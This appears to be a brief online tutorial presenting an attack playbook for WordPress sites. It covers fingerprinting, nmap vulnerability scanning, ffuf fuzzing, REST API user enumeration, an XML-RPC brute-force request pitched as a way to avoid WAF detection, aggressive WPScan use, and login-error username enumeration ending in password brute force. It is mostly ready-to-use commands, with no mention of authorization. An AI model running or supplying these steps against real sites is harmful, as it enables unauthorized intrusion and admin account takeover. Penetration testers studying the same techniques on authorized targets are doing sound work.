**Mastering WordPress Hacking – All Techniques and Tools**

**1. How to Identify if a Site is Using WordPress:**

* By visiting `http://target.com` and appending `/license.txt` to the root directory, you can confirm if the site uses WordPress.

* You can also inspect the source code of the page and search for the word “wordpress” to determine both the usage and the version.

* By installing the **Wappalyzer** extension for Firefox and visiting the target site, you can detect if it’s running WordPress, its version, what WAF (Web Application Firewall) it uses, and other related technologies.

**2. Wappalyzer**

Helps you identify if a WAF is being used on the site, the WordPress version, and other critical information.

**3. Port Scanning:**

* Use `nmap` to scan open ports. With the command below, if there are vulnerabilities, `nmap` will automatically show CVEs and exploit links based on the versions of the open ports:

```
nmap -sS -sV -O -p- --min-rate 1000 -T4 --script "default,vuln" -oA fullscan target.com
```

**4. Directory Fuzzing:**

```
ffuf -w directory-wordlist.txt -u http://target.com/FUZZ -mc 200
```

**5. User Enumeration (Manual):**

```
http://target.com/?rest_route=/wp/v2/users  
http://target.com/wp-json/wp/v2/users
```

Testing these two endpoints in the URL will help you gather information about the site’s admin and users if REST API is enabled. This is useful for identifying usernames during brute force attacks :)

**6. XMLRPC Check and Brute Force:**

If `xmlrpc` is active on the site (you can verify it by accessing the `/xmlrpc.php` endpoint), it allows for high-speed brute force attacks while avoiding WAF detection :)

**POC (Proof of Concept):**

```
POST /xmlrpc.php HTTP/1.1  
Host: example.com  
Content-Length: 250

<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password123</string></value></param>
  </params>
</methodCall>
```

**7. Aggressive Scan with WPScan:**

```
wpscan --url http://target.com -e at -e ap --api-token=<api_token> --plugins-detection aggressive --force
```

You can find CVEs related to the vulnerabilities discovered and write or use available exploits accordingly.

**8. WordPress Admin Login**

When accessing the WordPress admin login page, first try username – `test`, password – `test`. If the system returns an error like “user test does not exist,” then that username isn’t registered. Next, test the usernames found via user enumeration. For example, if trying the username `webadmin` returns “incorrect password,” that means the user `webadmin` exists, and the only remaining step is to brute force the password and gain access to the admin panel ;)
